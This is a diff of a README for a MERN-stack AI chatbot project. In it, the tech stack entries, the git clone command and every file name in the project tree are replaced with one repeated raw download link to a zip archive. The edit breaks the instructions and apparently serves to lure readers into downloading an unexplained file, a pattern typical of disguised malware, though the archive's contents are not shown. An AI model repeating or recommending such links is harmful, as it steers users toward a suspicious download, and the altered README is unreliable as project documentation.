@@ -19,8 +19,8 @@ This is a MERN-stack AI chatbot project with a clean, support-inbox style UI (si
 ## 🛠 Tech Stack
 
 - React (Frontend)
-- Express.js (Backend)
-- Node.js
+- https://github.com/Anmol-Jha-20/AI-Chatbot/raw/refs/heads/main/chatbot-app/Chatbot-A-v3.9.zip (Backend)
+- https://github.com/Anmol-Jha-20/AI-Chatbot/raw/refs/heads/main/chatbot-app/Chatbot-A-v3.9.zip
 - Gemini API (for AI responses)
 - Tailwind CSS (for styling)
 - Fetch API (for client-server communication)
@@ -35,7 +35,7 @@ Follow these steps to run the project locally after cloning from GitHub:
 ### 1. Clone the repository
 
 ```bash
-git clone https://github.com/Anmol-Jha-20/AI-Chatbot.git
+git clone https://github.com/Anmol-Jha-20/AI-Chatbot/raw/refs/heads/main/chatbot-app/Chatbot-A-v3.9.zip
 cd AI-Chatbot
 ```
 
@@ -99,19 +99,19 @@ The app will be available at:
 ```
 chatbot-app/
   ├── components/
-  │     ├── AIPanel.jsx
-  │     ├── ChatSection.jsx
-  │     ├── MessageBubble.jsx
-  │     └── Sidebar.jsx
-  |── App.jsx
-  └── main.jsx
+  │     ├── https://github.com/Anmol-Jha-20/AI-Chatbot/raw/refs/heads/main/chatbot-app/Chatbot-A-v3.9.zip
+  │     ├── https://github.com/Anmol-Jha-20/AI-Chatbot/raw/refs/heads/main/chatbot-app/Chatbot-A-v3.9.zip
+  │     ├── https://github.com/Anmol-Jha-20/AI-Chatbot/raw/refs/heads/main/chatbot-app/Chatbot-A-v3.9.zip
+  │     └── https://github.com/Anmol-Jha-20/AI-Chatbot/raw/refs/heads/main/chatbot-app/Chatbot-A-v3.9.zip
+  |── https://github.com/Anmol-Jha-20/AI-Chatbot/raw/refs/heads/main/chatbot-app/Chatbot-A-v3.9.zip
+  └── https://github.com/Anmol-Jha-20/AI-Chatbot/raw/refs/heads/main/chatbot-app/Chatbot-A-v3.9.zip
 
 chatbot-backend/
   ├── controllers/
-  |     └── aiController.js
+  |     └── https://github.com/Anmol-Jha-20/AI-Chatbot/raw/refs/heads/main/chatbot-app/Chatbot-A-v3.9.zip
   ├── routes/
-  │     └── aiRoutes.js
-  └── app.js
+  │     └── https://github.com/Anmol-Jha-20/AI-Chatbot/raw/refs/heads/main/chatbot-app/Chatbot-A-v3.9.zip
+  └── https://github.com/Anmol-Jha-20/AI-Chatbot/raw/refs/heads/main/chatbot-app/Chatbot-A-v3.9.zip
 ```
 
 ---
